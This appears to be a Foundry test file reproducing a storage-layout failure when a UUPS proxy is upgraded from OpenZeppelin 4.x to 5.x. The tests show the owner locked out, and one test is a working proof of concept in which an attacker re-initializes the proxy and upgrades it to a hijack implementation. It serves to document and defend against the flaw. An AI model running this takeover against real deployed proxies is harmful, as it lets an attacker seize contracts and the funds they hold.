// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {SubscriptionRegistryV1} from "../../src/uups/v1/SubscriptionRegistryV1.sol";
import {SubscriptionRegistryV2} from "../../src/uups/v2/SubscriptionRegistryV2.sol";
import {IUUPS, LabBase} from "../utils/LabBase.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {AccessManager} from "@openzeppelin/contracts/access/manager/AccessManager.sol";
import {IAccessManaged} from "@openzeppelin/contracts/access/manager/IAccessManaged.sol";

/// @notice Attacker-controlled implementation used to show what a re-initializer can do after the naive upgrade.
contract HijackImplementation {
    function proxiableUUID() external pure returns (bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    function hijacked() external pure returns (bool) {
        return true;
    }
}

/// @notice Reproduction of the failure class in OpenZeppelin issue #6362: a UUPS proxy upgraded straight from an
///         OZ 4.x (sequential storage) implementation to an OZ 5.x (ERC-7201) implementation.
/// @dev The upgrade itself succeeds, because V1 authorizes it with the owner it reads from slot 51. After that,
///      the V2 code reads the owner from `openzeppelin.storage.Ownable` and the initialized version from
///      `openzeppelin.storage.Initializable`; both namespaces are empty. Two consequences follow:
///        1. the real owner can never administer or upgrade the proxy again (every guard reverts);
///        2. `initialize` is callable again by anyone, so the first caller owns the proxy.
///      In #6362 the re-initializer also panicked (a string read from a legacy slot), which made the deadlock
///      total; here it succeeds, which turns the deadlock into a race that a front-runner wins.
contract NaiveMigration6362Test is LabBase {
    address internal proxy;
    address internal attacker = makeAddr("attacker");
    address internal alice = makeAddr("alice");

    function setUp() public {
        vm.warp(1_700_000_000);
        proxy = _deployV1(owner);
        vm.prank(owner);
        SubscriptionRegistryV1(proxy).createPlan(30 days);
        vm.prank(alice);
        SubscriptionRegistryV1(proxy).subscribe(1);

        // The naive step: V1 -> V2 without the bridge. It goes through: V1's guard reads slot 51.
        SubscriptionRegistryV2 v2 = new SubscriptionRegistryV2();
        vm.prank(owner);
        SubscriptionRegistryV1(proxy).upgradeTo(address(v2));
        assertEq(_implementation(proxy), address(v2));
    }

    function test_ownerAndInitializedStateAreStrandedInLegacySlots() public view {
        // Still there, in slots V2 never reads...
        assertEq(address(uint160(uint256(vm.load(proxy, LEGACY_OWNER_SLOT)))), owner);
        assertEq(uint256(vm.load(proxy, LEGACY_INITIALIZABLE_SLOT)), 1);
        // ...while the namespaces V2 does read are empty.
        assertEq(vm.load(proxy, OZ_OWNABLE_SLOT), bytes32(0));
        assertEq(vm.load(proxy, OZ_INITIALIZABLE_SLOT), bytes32(0));
        assertEq(SubscriptionRegistryV2(proxy).owner(), address(0));
        assertEq(SubscriptionRegistryV2(proxy).authority(), address(0));
        // The application data survived (it never moved): only the OZ parent state is lost.
        (uint256 planId,) = SubscriptionRegistryV2(proxy).subscriptionOf(alice);
        assertEq(planId, 1);
    }

    function test_realOwnerCanNoLongerUpgrade() public {
        address next = address(new SubscriptionRegistryV2());
        vm.expectRevert(abi.encodeWithSelector(IAccessManaged.AccessManagedUnauthorized.selector, owner));
        vm.prank(owner);
        IUUPS(proxy).upgradeToAndCall(next, "");
    }

    function test_realOwnerCanNoLongerAdminister() public {
        vm.startPrank(owner);
        vm.expectRevert(abi.encodeWithSelector(OwnableUpgradeable.OwnableUnauthorizedAccount.selector, owner));
        SubscriptionRegistryV2(proxy).createPlan(7 days);
        vm.expectRevert(abi.encodeWithSelector(OwnableUpgradeable.OwnableUnauthorizedAccount.selector, owner));
        SubscriptionRegistryV2(proxy).pause();
        vm.expectRevert(abi.encodeWithSelector(OwnableUpgradeable.OwnableUnauthorizedAccount.selector, owner));
        SubscriptionRegistryV2(proxy).transferOwnership(owner);
        // initializeV2 is owner-gated too, so the owner cannot use it to repair the proxy.
        vm.expectRevert(abi.encodeWithSelector(OwnableUpgradeable.OwnableUnauthorizedAccount.selector, owner));
        SubscriptionRegistryV2(proxy).initializeV2(address(this));
        vm.stopPrank();
    }

    /// @notice The lockout depends neither on who owned V1 nor on who calls: for any V1 owner, the naive upgrade
    ///         strands that owner in slot 51, and every owner-gated or upgrade entry point of V2 then rejects every
    ///         caller, the stranded owner included (the guards compare against the empty namespace).
    function testFuzz_everyCallerIsLockedOutWhoeverOwnedV1(uint256 ownerKey, uint256 callerKey) public {
        address v1Owner = vm.addr(bound(ownerKey, 1, SECP256K1_ORDER - 1));
        address caller = vm.addr(bound(callerKey, 1, SECP256K1_ORDER - 1));
        address p = _deployV1(v1Owner);
        address v2 = address(new SubscriptionRegistryV2());
        vm.prank(v1Owner);
        SubscriptionRegistryV1(p).upgradeTo(v2);

        assertEq(address(uint160(uint256(vm.load(p, LEGACY_OWNER_SLOT)))), v1Owner, "stranded in slot 51");
        assertEq(SubscriptionRegistryV2(p).owner(), address(0));
        vm.expectRevert(abi.encodeWithSelector(OwnableUpgradeable.OwnableUnauthorizedAccount.selector, caller));
        vm.prank(caller);
        SubscriptionRegistryV2(p).createPlan(7 days);
        vm.expectRevert(abi.encodeWithSelector(IAccessManaged.AccessManagedUnauthorized.selector, caller));
        vm.prank(caller);
        IUUPS(p).upgradeToAndCall(v2, "");
    }

    function test_initializeIsCallableAgain_andTheFirstCallerOwnsTheProxy() public {
        AccessManager attackerManager = new AccessManager(attacker);
        vm.prank(attacker);
        SubscriptionRegistryV2(proxy).initialize(attacker, address(attackerManager));
        assertEq(SubscriptionRegistryV2(proxy).owner(), attacker);
        assertEq(SubscriptionRegistryV2(proxy).authority(), address(attackerManager));

        // The attacker's own AccessManager admits them immediately (admin role, no delay).
        HijackImplementation hijack = new HijackImplementation();
        vm.prank(attacker);
        attackerManager.execute(proxy, abi.encodeCall(IUUPS.upgradeToAndCall, (address(hijack), "")));
        assertEq(_implementation(proxy), address(hijack));
        assertTrue(HijackImplementation(proxy).hijacked());
    }

    function test_theLegitimateOwnerCanOnlyWinARace() public {
        // The only "recovery" in the naive world is to call initialize before anyone else, which a public
        // mempool does not guarantee. The bridge removes the race entirely.
        AccessManager manager = _deployManager(governance, proxy);
        vm.prank(owner);
        SubscriptionRegistryV2(proxy).initialize(owner, address(manager));
        assertEq(SubscriptionRegistryV2(proxy).owner(), owner);

        vm.expectRevert(abi.encodeWithSignature("InvalidInitialization()"));
        vm.prank(attacker);
        SubscriptionRegistryV2(proxy).initialize(attacker, address(manager));
    }
}
